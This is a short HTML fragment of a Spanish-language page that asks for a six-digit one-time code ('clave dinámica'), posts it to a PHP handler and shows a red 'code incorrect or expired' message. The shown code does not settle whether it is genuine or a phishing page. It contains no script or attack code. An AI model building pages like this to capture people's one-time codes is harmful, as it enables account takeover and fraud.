...
<body>
    <div class="details">
        ...
        <form action="process/process_otp.php" method="POST">
            ...
            <input type="text" name="claveDinamica" placeholder="Código" required minlength="6" maxlength="6" pattern="\d*" inputmode="numeric">            
            
           <br> <a style="color:rgb(255, 0, 0); margin-bottom:0px; ">Tu código no es correcto o ha éxpirado</a>
